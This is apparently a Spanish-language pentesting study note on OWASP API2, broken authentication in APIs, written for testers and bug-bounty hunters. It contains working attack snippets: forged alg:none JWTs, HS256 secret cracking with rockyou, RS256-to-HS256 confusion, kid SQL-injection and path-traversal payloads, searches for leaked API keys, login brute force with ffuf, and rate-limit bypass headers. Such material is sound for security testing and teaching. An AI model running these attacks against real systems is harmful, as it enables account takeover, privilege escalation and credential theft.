# API2 — Broken Authentication

Los mecanismos de autenticación en APIs son frecuentemente más débiles que en aplicaciones web tradicionales. A diferencia de las webs (que usan sesiones con cookies HttpOnly), las APIs usan tokens que viajan en cada petición y son más fáciles de robar, reutilizar o falsificar.

```
Problemas comunes:
→ JWT sin firma o con firma débil
→ Tokens que no expiran
→ API keys hardcodeadas en el código fuente
→ Sin rate limiting en el endpoint de login
→ Tokens enviados en URLs (quedan en logs)
→ Secretos en variables de entorno filtradas
→ Sin validación del token en algunos endpoints
```

### JWT en APIs — Ataques principales

#### Estructura del JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header (base64)
.eyJ1c2VyX2lkIjoxMDQyLCJyb2xlIjoidXNlciJ9  ← Payload (base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature

# Decodificar manualmente
echo "eyJ1c2VyX2lkIjoxMDQyLCJyb2xlIjoidXNlciJ9" | base64 -d
→ {"user_id":1042,"role":"user"}
```

#### Ataque 1 — alg:none (sin firma)

```bash
# Cambiar el algoritmo a "none" elimina la verificación de firma
# El servidor acepta el token aunque esté modificado

# 1. Decodificar el JWT actual
python3 -c "
import base64, json
token = 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEwNDIsInJvbGUiOiJ1c2VyIn0.xxx'
parts = token.split('.')
payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
print(json.loads(base64.b64decode(payload)))
"
# → {'userId': 1042, 'role': 'user'}

# 2. Forjar nuevo token sin firma
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'userId':1042,'role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"
# → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwNDIsInJvbGUiOiJhZG1pbiJ9.

# 3. Usar el token modificado
# Si el servidor lo acepta → escalada a admin
```

#### Ataque 2 — Weak secret (crackear la firma HS256)

```bash
# Si el secreto es débil, se puede crackear offline

# Con hashcat
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
# Formato del archivo jwt_token.txt: el token completo tal cual

# Con john
john jwt_token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Con jwt_tool
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Una vez encontrado el secreto, forjar token con rol de admin
python3 -c "
import jwt
payload = {'userId': 1042, 'role': 'admin', 'exp': 9999999999}
token = jwt.encode(payload, 'secret_encontrado', algorithm='HS256')
print(token)
"
```

#### Ataque 3 — RS256 → HS256 confusion

```bash
# Si el servidor usa RS256 (clave pública/privada)
# y el atacante obtiene la clave pública,
# puede firmar el token como HS256 usando la clave pública como secret

# 1. Obtener la clave pública (a veces expuesta en /.well-known/jwks.json)
curl https://target.com/.well-known/jwks.json
curl https://target.com/api/auth/keys

# 2. Convertir JWK a PEM
python3 -c "
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import json, base64

# Usar jwcrypto o PyJWT para convertir
"
# Herramienta: jwt_tool
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# 3. Firmar con la clave pública como secret HS256
python3 -c "
import jwt
with open('public_key.pem', 'rb') as f:
    pubkey = f.read()
payload = {'userId': 1042, 'role': 'admin'}
token = jwt.encode(payload, pubkey, algorithm='HS256')
print(token)
"
```

#### Ataque 4 — kid injection

```bash
# El header "kid" (key ID) indica qué clave usar para verificar el token
# Si el valor de kid se usa sin sanitizar en una query SQL o path de archivo:

# SQL injection en kid:
# kid: "xxx' UNION SELECT 'attacker_secret' -- -"
# → El servidor usa 'attacker_secret' como clave de verificación
# → Firmar el token con 'attacker_secret' y el payload modificado

# Path traversal en kid:
# kid: "../../dev/null"
# → El servidor lee /dev/null (vacío) como clave
# → Firmar el token con "" (string vacío) como clave
python3 -c "
import jwt, base64
payload = {'userId': 1042, 'role': 'admin'}
header = {'kid': '../../dev/null'}
token = jwt.encode(payload, '', algorithm='HS256', headers=header)
print(token)
"
```

#### jwt\_tool — La herramienta principal para JWT en APIs

```bash
# Instalación
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Analizar un JWT
python3 jwt_tool.py TOKEN

# Probar todos los ataques automáticamente
python3 jwt_tool.py TOKEN -t https://target.com/api/profile -rh "Authorization: Bearer TOKEN" -M pb

# Ataque alg:none
python3 jwt_tool.py TOKEN -X a

# Crackear secreto
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# RS256 → HS256
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# Modificar payload y re-firmar con secreto conocido
python3 jwt_tool.py TOKEN -T -S hs256 -p "secreto_crackeado"
# → Editor interactivo para modificar el payload
```

### API Keys — Búsqueda y explotación

#### Encontrar API keys expuestas

```bash
# En el código fuente JS de la app
# DevTools → Sources → buscar patrones
grep -r "api_key\|apikey\|api-key\|token\|secret\|Bearer" --include="*.js" .
grep -r "Authorization:" --include="*.js" .

# En repositorios GitHub (búsqueda de secretos)
# GitHub: buscar "target.com api_key" en la barra
# Herramientas: truffleHog, gitleaks
trufflehog git https://github.com/empresa/repo
gitleaks detect --source . -v

# En archivos de configuración expuestos
/.env
/.env.local
/.env.production
/config.js
/config.json
/settings.py
/application.properties

# En headers de respuesta (a veces los exponen)
curl -I https://target.com/api/v1/users
# Buscar: X-API-Key, X-Token, Authorization en respuestas
```

#### Probar API keys encontradas

```bash
# Si encuentras una API key en JS o en un repositorio:
curl -H "X-API-Key: FOUND_KEY" https://target.com/api/v1/users
curl -H "Authorization: ApiKey FOUND_KEY" https://target.com/api/v1/admin
curl "https://target.com/api/v1/users?api_key=FOUND_KEY"

# Verificar el alcance de la key
# ¿Tiene acceso de lectura? ¿De escritura? ¿A endpoints de admin?
```

### Tokens que no expiran

```bash
# Verificar si el token tiene expiración
# En el payload del JWT buscar: "exp"
# Si no hay campo "exp" → el token no expira nunca

# Verificar si el servidor valida la expiración
# 1. Obtener un token
# 2. Esperar a que expire (o modificar el exp a una fecha pasada)
# 3. Usarlo → si funciona → el servidor no valida exp

# En jwt_tool: modificar exp a pasado
python3 jwt_tool.py TOKEN -T
# Cambiar exp a: 1  (timestamp pasado)
# Re-firmar → enviar → ¿funciona?
```

### Sin rate limiting en autenticación

```bash
# Probar bruteforce en el endpoint de login de la API
# Si no hay rate limiting → credenciales por fuerza bruta

# Con ffuf
ffuf -u https://target.com/api/auth/login \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":"FUZZ"}' \
    -w /usr/share/wordlists/rockyou.txt \
    -mc 200 \
    -t 50     # 50 threads

# Con Burp Intruder
# 1. Capturar POST /api/auth/login
# 2. Send to Intruder → marcar §password§
# 3. Payload: wordlist
# 4. Si no hay 429 ni delay → sin rate limiting

# Detectar rate limiting
# → 429 Too Many Requests → hay rate limiting
# → Mismo tiempo de respuesta tras 100 peticiones → sin rate limiting

# Bypass de rate limiting en APIs
# → Cambiar IP (X-Forwarded-For: RANDOM)
# → Cambiar User-Agent en cada petición
# → Distribuir entre cuentas (credential stuffing)
```

### Tokens en URLs (información sensible en logs)

```bash
# Si la API acepta el token como parámetro GET en lugar de header:
https://target.com/api/users?token=eyJhbGciOiJIUzI1NiJ9...
https://target.com/api/export?api_key=sk-prod-abc123

# Problema: las URLs se guardan en:
# → Logs del servidor web
# → Historial del navegador
# → Logs de proxies corporativos
# → Header Referer si el usuario hace clic en un link
# → Herramientas de analítica (Google Analytics, etc.)

# Cómo detectar:
# Revisar si la API acepta tokens en query params además de en headers
curl "https://target.com/api/profile?token=TOKEN"
curl "https://target.com/api/data?api_key=KEY&user_id=1042"
```

### Checklist API2

```
JWT:
□ Probar alg:none (token sin firma)
□ Intentar crackear el secreto HS256 con rockyou
□ Verificar si hay JWKS endpoint expuesto (/.well-known/jwks.json)
□ Probar RS256 → HS256 si hay clave pública disponible
□ Comprobar si el campo "exp" existe y se valida
□ Probar kid injection (SQL, path traversal)

API Keys:
□ Buscar keys en el JS de la app
□ Buscar keys en repositorios Git públicos
□ Verificar si las keys tienen ámbito limitado o acceso total

Rate Limiting:
□ Enviar 50+ peticiones seguidas al endpoint de login
□ Verificar si hay 429 o lockout
□ Probar bypass con X-Forwarded-For

General:
□ Verificar si los tokens se aceptan en query params
□ Comprobar si hay endpoints sin autenticación (/api/health, /api/debug...)
□ Probar con token de otra cuenta en el mismo endpoint
```

> jwt\_tool con el flag `-M pb` (playbook scan) prueba automáticamente todos los ataques JWT conocidos contra un endpoint real, mostrando cuáles funcionan. Es el equivalente a sqlmap para JWT.

> Las API keys en repositorios públicos de GitHub son uno de los hallazgos más frecuentes y más fáciles en bug bounty. Buscar `site:github.com "target.com" "api_key"` en Google suele dar resultados sorprendentes.

> Un JWT sin campo `exp` o con `exp` muy lejano es un hallazgo reportable por sí solo aunque no haya RCE: si el token de un usuario comprometido nunca expira, no hay forma de revocar el acceso.
